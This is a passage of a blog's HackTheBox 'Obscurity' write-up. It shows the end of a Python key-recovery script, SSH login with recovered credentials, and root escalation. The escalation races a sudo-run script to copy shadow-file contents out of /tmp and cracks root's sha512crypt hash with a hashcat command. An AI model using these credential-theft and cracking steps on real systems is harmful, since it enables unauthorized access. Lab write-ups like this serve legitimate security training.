<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span>            <span style="color:#6ab825;font-weight:bold">for</span> j <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">255</span>):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span>                <span style="color:#999;font-style:italic"># print(pos, end=&#39;&#39;)</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span>                <span style="color:#999;font-style:italic"># print(ch[pos], end=&#39;&#39;)</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span>                <span style="color:#6ab825;font-weight:bold">print</span>(key + <span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span>                newChr = <span style="color:#24909d">ord</span>(x)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">33</span>                newChr = <span style="color:#24909d">chr</span>((newChr - j) % <span style="color:#3677a9">255</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">34</span>                <span style="color:#6ab825;font-weight:bold">if</span> ch[pos] == newChr:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">35</span>                    key += <span style="color:#24909d">chr</span>(j)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">36</span>                    pos = pos + <span style="color:#3677a9">1</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">37</span>                    <span style="color:#6ab825;font-weight:bold">break</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">38</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">39</span><span style="color:#6ab825;font-weight:bold">print</span>(key)
</code></pre></div><p>Running the script, we find the key:
<strong>alexandrovich</strong></p>
<p>Now we decrypt the passwordremider.txt:</p>
<p><img src="/img/htb_obscurity/10.png" alt=""></p>
<p>We found our password for the user.
We can use these creds to login using ssh as the user robert and read out user.txt file</p>
<p><img src="/img/htb_obscurity/11.png" alt=""></p>
<h2 id="privilege-escalation---root">Privilege escalation - Root:</h2>
<hr>
<p>Running command <code>sudo -l</code>, we find following:</p>
<p><img src="/img/htb_obscurity/12.png" alt=""></p>
<p>So, we can run the command <code>/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code> as root</p>
<p>We have a look at the script BetterSSH.py</p>
<p><img src="/img/htb_obscurity/13.png" alt=""></p>
<p>We see here that during the login process using the script, it temporarily
writes the shadow file into the tmp/SSH file. So we can read the shadow file from
the tmp/SSH folder while the ssh login is running. The file is written after
taking the password input. But as we run the script, we see that as soon as we
enter the password, we get an invalind user error. So, we have a race condition
here. What we do is run a while loop in the background that continuosly copies
all files in the /tmp/SSH folder into a folder of our own e.g. /tmp/fm. Then if
we run our ssh script, the shadow file will get copied into the /tmp/SSH folder
and so to our own created dir.</p>
<p><img src="/img/htb_obscurity/14.png" alt=""></p>
<p>We see a new file in our created directory. We check the contents of the file
and get the password hashes.</p>
<p><img src="/img/htb_obscurity/15.png" alt=""></p>
<p>We see that the hash is an crypt hash.We check the type of the hash using
hashcat. SInce it has got $6, this should be sha512crypt.</p>
<p><img src="/img/htb_obscurity/16.png" alt=""></p>
<p>So now we decrypt the hash with:</p>
<pre><code>hashcat -m 1800 -o root_pass root_hash /usr/share/wordlists/rockyou.txt
</code></pre><p>And after waiting some time, we get our required root pass in the root_pass
file:</p>
<p><img src="/img/htb_obscurity/17.png" alt=""></p>
<p>We use the password to login as root using su and get our root.txt file</p>
<p><img src="/img/htb_obscurity/18.png" alt=""></p>

    </div>
    <div class="article-footer">
<blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    <li class="post-copyright-link hidden-xs">
      <strong>Permalink: </strong>
      <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-obscurity-writeup/" title="Hackthebox - Obscurity Writeup" target="_blank" rel="external">https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-obscurity-writeup/</a>
    </li>
    <li class="post-copyright-license">
      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
    </li>
  </ul>
</blockquote>

<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="https://fmash16.github.io/avatar.png" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
        <div>Hack the Planet</div>
      </div>
    </figure>
  </div>
</div>

    </div>
  </article>
<section id="comments">
</section>

</div><nav class="bar bar-footer clearfix" data-stick-bottom>
    <div class="bar-inner">
        <ul class="pager pull-left">
            <li class="prev">
                <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-openadmin-writeup/" title="Hackthebox - OpenAdmin Writeup"><i
                        class="icon icon-angle-left"
                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
            </li>
            <li class="next">
                <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-web-challenge-writeups/"
                    title="Hackthebox[Web-Challenge] Writeups"><span>Newer&nbsp;&nbsp;</span><i
                        class="icon icon-angle-right" aria-hidden="true"></i></a>
            </li>
            
            <li class="toggle-toc">
                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
                    title="Catalogue" role="button">
                    <span>[&nbsp;</span><span>Index</span>
                    <i class="text-collapsed icon icon-anchor"></i>
                    <i class="text-in icon icon-close"></i>
                    <span>]</span>
                </a>
            </li>
        </ul>
        <div class="bar-right">
            <div class="share-component" data-sites="facebook,twitter"
                data-mobile-sites="">Share on:</div>
        </div>
    </div>
</nav>



</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
<ul class="social-links">
    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
            <i class="icon icon-github"></i></a></li>
    <li><a href="https://fmash16.github.io/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
            <i class="icon icon-rss"></i></a></li>
    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
            <i class="icon icon-twitter"></i></a></li>
</ul>
  <div class="copyright">
    &copy;2020  -
    2020
    
    
    </div>
  </div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
            showMathMenu: false, //disables context menu
            tex2jax: {
            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
           }
    });
</script>


<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
<script>
    window.jQuery || document.write('<script src="js/jquery.min.js"></script>')
</script>
<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
    hljs.configure({
        tabReplace: '    ', 
        classPrefix: ''     
        
    })
    hljs.initHighlightingOnLoad();
</script>
<script src="https://fmash16.github.io/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
<script src="https://fmash16.github.io/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>

<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
            },
            ROOT_URL: 'https:\/\/fmash16.github.io\/',
            CONTENT_URL: 'https:\/\/fmash16.github.io\/\/searchindex.json ',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script type="text/javascript" src="https://fmash16.github.io/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
<script>
    tocbot.init({
        
        tocSelector: '.js-toc',
        
        contentSelector: '.js-toc-content',
        
        headingSelector: 'h1, h2, h3',
        
        hasInnerContainers: true,
    });
</script>


/* copy code button */
<script>
function addCopyButtons(clipboard) {
    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
        var button = document.createElement('button');
        button.className = 'copy-code-button';
        button.type = 'button';
        button.innerText = 'Copy';

        button.addEventListener('click', function () {
              
            tmp = codeBlock.innerText.split("\n");
            cutChar = (tmp.length>8) ? 2 : 1;
            for(i=0; i<tmp.length; i++){
              tmp[i] = tmp[i].substring(cutChar);
            }
            block = tmp.join("\n");
            clipboard.writeText(block).then(function () {
                

                button.blur();

                button.innerText = 'Copied!';

                setTimeout(function () {
                    button.innerText = 'Copy';
                }, 2000);
            }, function (error) {
                button.innerText = 'Error';
            });
        });

        var pre = codeBlock.parentNode;
        if (pre.parentNode.classList.contains('highlight')) {
            var highlight = pre.parentNode;
            highlight.parentNode.insertBefore(button, highlight);
        } else {
            pre.parentNode.insertBefore(button, pre);
        }
    });
}
if (navigator && navigator.clipboard) {
    addCopyButtons(navigator.clipboard);
} else {
    var script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
    script.crossOrigin = 'anonymous';
    script.onload = function() {
        addCopyButtons(clipboard);
    };

    document.body.appendChild(script);
}

</script>



  </body>
</html>
